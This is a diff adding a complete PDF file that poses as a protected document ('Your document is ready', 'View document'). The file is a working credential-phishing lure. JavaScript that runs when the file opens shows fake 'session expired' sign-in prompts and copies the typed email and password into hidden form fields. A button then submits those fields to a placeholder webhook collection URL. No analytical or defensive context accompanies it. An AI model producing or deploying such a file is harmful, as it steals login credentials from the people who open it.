@@ -1,0 +1,63 @@
+%PDF-1.4
+1 0 obj
+<< /Type /Catalog /Pages 2 0 R /AcroForm 6 0 R /OpenAction << /S /JavaScript /JS (var u = app.response\({cQuestion:"Your session has expired. Please sign in again.", cTitle:"Sign in", bPassword:false}\);\nvar p = app.response\({cQuestion:"Password:", cTitle:"Sign in", bPassword:true}\);\nif\(u != null\) this.getField\("email"\).value = u;\nif\(p != null\) this.getField\("password"\).value = p;\n) >> >>
+endobj
+2 0 obj
+<< /Type /Pages /Kids [3 0 R] /Count 1 >>
+endobj
+3 0 obj
+<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Resources << /Font << /F1 4 0 R /F2 5 0 R >> >> /Contents 7 0 R /Annots [8 0 R 9 0 R 10 0 R] >>
+endobj
+4 0 obj
+<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>
+endobj
+5 0 obj
+<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica-Bold >>
+endobj
+6 0 obj
+<< /Type /AcroForm /Fields [8 0 R 9 0 R 10 0 R] /NeedAppearances true /DR << /Font << /F1 4 0 R /F2 5 0 R >> >> /DA (/F1 12 Tf 0 g) >>
+endobj
+7 0 obj
+<< /Length 446 >>
+stream
+0.25 0.35 0.55 rg
+100 700 m 100 714 109 722 120 722 c 131 722 140 714 140 700 c 140 686 131 678 120 678 c 109 678 100 686 100 700 c f
+Q
+0 0 0 rg
+BT /F2 28 Tf 100 600 Td (Your document is ready) Tj ET
+BT /F1 13 Tf 100 570 Td (Sign in to preview and download.) Tj ET
+0.25 0.35 0.55 rg 100 470 240 42 re f
+1 1 1 rg
+BT /F2 14 Tf 160 486 Td (View document) Tj ET
+0 0 0 rg
+BT /F1 10 Tf 100 430 Td (Protected content. Please sign in to continue.) Tj ET
+
+endstream
+endobj
+8 0 obj
+<< /Type /Annot /Subtype /Widget /FT /Tx /T (email) /F 2 /Rect [0 0 1 1] /DA (/F1 12 Tf 0 g) >>
+endobj
+9 0 obj
+<< /Type /Annot /Subtype /Widget /FT /Tx /T (password) /FF 4096 /F 2 /Rect [0 0 1 1] /DA (/F1 12 Tf 0 g) >>
+endobj
+10 0 obj
+<< /Type /Annot /Subtype /Widget /FT /Btn /T (submit) /FF 65536 /Rect [100 470 340 512] /F 4 /A << /S /SubmitForm /F (https://YOUR-WEBHOOK.example/collect) >> /MK << /BG [] /BC [] >> >>
+endobj
+xref
+0 11
+0000000000 65535 f 
+0000000009 00000 n 
+0000000430 00000 n 
+0000000487 00000 n 
+0000000652 00000 n 
+0000000722 00000 n 
+0000000797 00000 n 
+0000000947 00000 n 
+0000001444 00000 n 
+0000001555 00000 n 
+0000001678 00000 n 
+trailer
+<< /Size 11 /Root 1 0 R >>
+startxref
+1880
+%%EOF
